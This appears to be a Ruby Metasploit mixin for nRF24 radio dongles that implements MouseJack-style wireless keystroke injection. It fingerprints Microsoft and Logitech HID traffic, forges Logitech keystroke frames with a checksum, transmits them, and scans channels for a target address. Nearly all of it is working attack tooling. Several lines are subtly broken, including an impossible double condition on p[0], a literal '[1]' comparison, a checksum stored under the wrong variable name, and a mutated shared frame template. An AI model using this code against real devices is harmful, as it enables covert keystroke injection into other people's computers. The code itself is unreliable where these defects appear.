# -*- coding: binary -*-
module Msf
class Post
module Hardware
module RFTransceiver

module NordicRF

  # Checks to see if this module is a NordicRF Transceiver module
  # @return [Boolean] true if client.rftransceiver is loaded and capability has nrf24
  def is_nordicrf?
    return true if client.rftransceiver and client.exploit and client.exploit.hw_capabilities.key? "nrf24"
    print_error("Not a NordicRF Transceiver module")
    return false
  end

  # Fingerprint HID payload as used by JackIt
  # @param p [String] Binary string
  # @return [String] Brand name
  def fingerprint_hid_device(p)
    return "" if not p
    return "Microsoft HID" if p.size == 19 && (p[0] == "\x08" || p[0] == "\x0c") && p[6] == "\x40"
    return "MS Encrypted HID" if p.size == 19 && p[0] == "\x0a" # XOR "Encrypted"
    return "Logitech HID" if p.size == 10 && p[0] == "\x0" && p[1] == "\xc2" # Mouse movement
    return "Logitech HID" if p.size == 22 && p[0] == "\x16" && p[0] == "\x0" && p[1] == "\xd3" # Keystroke
    return "Logitech HID" if p.size == 5 && p[0] == "\x0" && p[1] == "\x40" # keepalive
    return "Logitech HID" if p.size == 10 && p[0] == "\x0" && [1] == "\x4f" # sleep timer
    return ""
  end

  # Simple Logitech CRC.  Algorithm taken from the JackIt source based on the KeyKeriki paper
  def logitech_checksum(payload)
    cksum = 0xff
    (0..payload.size - 1).each do |n|
      cksum = (cksum - payload[n]) & 0xff
    end
    chksum = (cksum + 1) & 0xff
    payload[-1] = cksum
    return payload
  end

  # Build Logitech Frames
  def build_logitech_frames(attack)
    # Mouse frames use type 0xC2
    # Multmedia key frames use type 0xC3
    # To see why this works, read diagram 2.3.2 of:
    # https://lekensteyn.nl/files/logitech/Unifying_receiver_DJ_collection_specification_draft.pdf
    # (discovered by wiresharking usbmon)
    payload_template = [0, 0xC1, 0, 0, 0, 0, 0, 0, 0, 0]
    keepalive = [0x00, 0x40, 0x04, 0xB0, 0x0C]
    hello = [0x00, 0x4F, 0x00, 0x04, 0xB0, 0x10, 0x00, 0x00, 0x00, 0xED]
    (0..attack.size-1).each do |i|
      key = attack[i]
      return if key.nil?
      if i == 0
        key["frames"] = [[hello, 12]]
      else
        key["frames"] = []
      end
      next_key = nil
      next_key = attack[i+1] if i < attack.size - 1
      payload = payload_template
      if key["hid"] || key["mod"]
         payload[2] = key["mod"]
         payload[3] = key["hid"]
         key["frames"] << [logitech_checksum(payload), 12]
         key["frames"] << [keepalive, 0]
         if not next_key 
           key["frames"] << [logitech_checksum(payload_template), 0]
         elsif key["hid"] == next_key["hid"] || next_key["sleep"]
           key["frames"] << [logitech_checksum(payload_template), 0]
         end
      elsif key["sleep"]
         count = key["sleep"].int / 10
         (0..count).each do
           key["frames"] << [keepalive, 10]
         end
      end
      attack[i] = key
    end
    return attack
  end

  # After building frames use transmit keys to broadcast the payloads
  # @param keys [Hash] generated from build_xxx_frames
  # @param repeat [Integer] How many times to try to retransmit on a set channel
  def transmit_frames(keys, repeat=15)
    enable_crc
    keys.each do |key|
      key["frames"].each do |frame|
        msg = frame[0].map(&:chr).join
        rfxmit(msg, 1)
        sleep(frame[1] / 1000.0)
      end
    end
  end

  # Find what channel an address is using
  # @param address [String] Address to search for
  # @return [Integer] Channel number, returns -1 if not found
  def find_channel(address)
    ping_pkt = [ 0x0f, 0x0f, 0x0f, 0x0f ].map(&:chr).join
    set_address(address)
    enable_crc
    set_mode("rx")
    (2..83).each do |channel|
      set_channel(channel)
      return channel if rfxmit(ping_pkt, 1)
    end
    return -1
  end

  ## Helper methods
  # These are just aliases for RFTransceiver core methods but with the terminology that is better
  # suited for NordicRF

  # Enables the Low Noise Amplifiers on dongles that support it.  Should be safe to run if LNA
  # is not present.
  def enable_lna
    max_power
  end

  # Sets the Sync word to an address to filter on
  # @param address [String] A hex address of the target device
  def set_address(address)
    set_sync_word(address)
  end

end

end
end
end
end
